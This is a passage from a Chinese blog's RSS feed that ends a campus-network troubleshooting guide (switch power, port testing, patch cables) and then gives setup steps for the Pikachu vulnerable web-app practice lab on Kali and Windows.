error错误的，现在自助服务系统验证他的密码是否真的错的，如果不是，那就是账号问题。<br>#要检查账号的运营商、问题是否真的存在<br>（二）登录页显示不安全、证书有问题<br>可能是网址输入错误，是<a href="http://10.0.0.62/">http://10.0.0.62</a>,    而不是 <a href="https://10.0.0.62/">https://10.0.0.62。</a><br>输入打多S变成不安全网页。<br><img src="/image/39.png"></p><h3 id="四、机房相关故障"><a href="#四、机房相关故障" class="headerlink" title="四、机房相关故障"></a>四、机房相关故障</h3><p>（一）交换机<br>如果交换机后台显示某一个机房的所有设备都挂了，往往是机房供电除了问题。一般都是机房供电总闸跳闸导致的。机房供电问题导致的情况，一般在QQ故障群会有动静的。所以如果QQ故障去忽然有不少人说不能WiFi没了，WiFi信号很弱，网线上不了网的话，就赶紧查查交换机后台。但是也有可能故障群是没有动静的。雷雨天气过了，检查一下交换机后台，这个时候查到电闸跳闸的可能性比较大。但是打雷的时候不要去机房处理，注意个人人身安全。有时候交换机可能没有挂，但是不正常工作，把机柜的电断了再通电，重启交换机可能就解决办法了。注意要把影响范围缩小：如果确定只是无线用不了，那么拔掉无线机柜的插头再插就可以了，不要开关总闸。<br>（二）端口</p><ol><li>先用测线仪测一下端口（第1236四个灯是都亮，那么就可以正常使用了），应该是有其中一个或者两个灯是不亮的。</li><li>先用一字螺丝刀刮一下里面的金属条，注意不要太大力，以免里面的金属条无法正常回弹到原位，如果恢复，后继操作不用进行（处理金属条氧化问题）。</li><li>由于拆面板，换端口比较困难，所以建议先去机房找到配线架上面对应的端口，然后用测线仪测一测配线架端口到宿舍端口的问题，验证是不是配线架端口到宿舍端口的问题。如果是，那就是宿舍端口的问题了。如果不是，那可能要进行跳线。如果是的话，把宿舍端口拆下来，检查是否有金属条无法正常回弹，如果有的话，试着用尖锐的东西复原。如果没有的话，可以换端口了。</li></ol><p>（三）跳线<br>如果验证了宿舍端口到机房配线架端口的线路是正常的话，可能测试交换机端口的问题了。用测线仪测试交换机端口，测线仪的1236四个灯有若干个不亮的话，那就是交换机端口的问题，需要进行跳线了。本来通过一根网线把配线架的端口和交换机的端口连接起来的，现在交换机的端口坏了，那么我们就要用另一跟网线把配线架上面的端口和交换机其他好的端口相连接即可。</p><h3 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h3><p>如何更改电脑网络DNS (baidu.com)     &#x2F;&#x2F;win10中修改ip，dns<br><a href="https://baijiahao.baidu.com/s?id=1612906041166793439&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1612906041166793439&amp;wfr=spider&amp;for=pc</a><br>Win7系统电脑怎么设置IP地址-百度经验 (baidu.com)     &#x2F;&#x2F;win7中修改ip，dns<br><a href="https://jingyan.baidu.com/article/e8cdb32b6c3b8137052badf7.html">https://jingyan.baidu.com/article/e8cdb32b6c3b8137052badf7.html</a><br>win10怎么重置网络配置 如何重置电脑网络设置-百度经验 (baidu.com)     &#x2F;&#x2F;win10中重置网络<br><a href="https://jingyan.baidu.com/article/1612d5000a7534a20e1eee8c.html">https://jingyan.baidu.com/article/1612d5000a7534a20e1eee8c.html</a><br>Windows 7 操作系统重置网络命令-百度经验 (baidu.com)     &#x2F;&#x2F;win7中重置网络<br><a href="https://jingyan.baidu.com/article/3ea51489b483ec52e61bba91.html">https://jingyan.baidu.com/article/3ea51489b483ec52e61bba91.html</a><br>如何将win10电脑设置成共享wifi热点-百度经验 (baidu.com)     &#x2F;&#x2F;win10中设置网络热点<br><a href="https://jingyan.baidu.com/article/fec4bce2b84fc6f2618d8bf0.html">https://jingyan.baidu.com/article/fec4bce2b84fc6f2618d8bf0.html</a><br>详解win7如何设置wifi热点 - Win7之家 (windows7en.com)     &#x2F;&#x2F;win7中设置网络热点(不推荐)<br><a href="http://www.windows7en.com/jiaocheng/47115.html">http://www.windows7en.com/jiaocheng/47115.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题一：开网常见问题&quot;&gt;&lt;a href=&quot;#问题一：开网常见问题&quot; class=&quot;headerlink&quot; title=&quot;问题一：开网常见问题&quot;&gt;&lt;/a&gt;问题一：开网常见问题&lt;/h2&gt;&lt;h3 id=&quot;充进去的钱可不可以退？&quot;&gt;&lt;a href=&quot;#充进去的钱可不可以退</summary>
      
    
    
    
    <category term="故障问题" scheme="https://jielunya.github.io/categories/%E6%95%85%E9%9A%9C%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="校园网" scheme="https://jielunya.github.io/tags/%E6%A0%A1%E5%9B%AD%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>搭建pikachu环境</title>
    <link href="https://jielunya.github.io/2022/11/21/%E6%90%AD%E5%BB%BApikachu%E7%8E%AF%E5%A2%83/"/>
    <id>https://jielunya.github.io/2022/11/21/%E6%90%AD%E5%BB%BApikachu%E7%8E%AF%E5%A2%83/</id>
    <published>2022-11-21T12:38:19.897Z</published>
    <updated>2022-11-20T14:00:04.795Z</updated>
    
    <content type="html"><![CDATA[<p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，可以选择pikahcu。</p><h1 id="Kali系统下搭建："><a href="#Kali系统下搭建：" class="headerlink" title="Kali系统下搭建："></a>Kali系统下搭建：</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="attr">https</span>:<span class="comment">//github.com/zhuifengshaonianhanlu/pikachu/archive/refs/heads/master.zip</span></span><br><span class="line"></span><br><span class="line">如遇到拒绝连接，则可以手动下载，拉到kali桌面。</span><br><span class="line"></span><br><span class="line">在桌面右键打开终端，输入命令，将压缩包解压。</span><br><span class="line">unzip pikachu-master.<span class="property">zip</span></span><br><span class="line"></span><br><span class="line">将文件夹放到/<span class="keyword">var</span>/www/html中</span><br><span class="line">mv pikachu-master /<span class="keyword">var</span>/www/html/pikachu</span><br><span class="line"></span><br><span class="line">开启相关服务（kali自带<span class="variable constant_">PHP</span>+<span class="variable constant_">MYSQL</span>）</span><br><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br><span class="line"></span><br><span class="line">登录到网页界面，浏览器输入<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/pikachu</span><br><span class="line"></span><br><span class="line">点击初始化安装→安装/初始化</span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">数据库连接成功!</span><br><span class="line">新建数据库:pikachu成功!</span><br><span class="line">创建数据库数据成功!</span><br></pre></td></tr></table></figure><h1 id="Windows下搭建"><a href="#Windows下搭建" class="headerlink" title="Windows下搭建"></a>Windows下搭建</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装phpstudy，并部署启动环境</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//www.xp.cn/download.html</span></span><br></pre></td></tr></table></figure><p><img src="/image1/1.png"><br><img src="/image1/2.png"><br><img src="/image1/3.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下载pikachu压缩包</span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/zhuifengshaonianhanlu/pikachu</span></span><br><span class="line"></span><br><span class="line">解压到phpstudy_pro\<span class="variable constant_">WWW</span>目录下</span><br><span class="line"></span><br><span class="line">修改配置文件，否则是连不上数据库的</span><br><span class="line"></span><br><span class="line">phpstudy_pro\<span class="variable constant_">WWW</span>\pikachu-master\inc\conf.<span class="property">inc</span>.<span class="property">php</span></span><br></pre></td></tr></table></figure><p><img src="/image1/4.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">浏览器打开<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span>/pikachu-master/</span><br><span class="line"></span><br><span class="line">点击初始化安装→安装/初始化</span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">数据库连接成功!</span><br><span class="line">新建数据库:pikachu成功!</span><br><span class="line">创建数据库数据成功!</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，可以选择pikahcu。&lt;/p&gt;
&lt;h1 id=&quot;Kali系统下搭建：&quot;&gt;&lt;a href=&quot;#Kali系统下搭建：&quot; class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
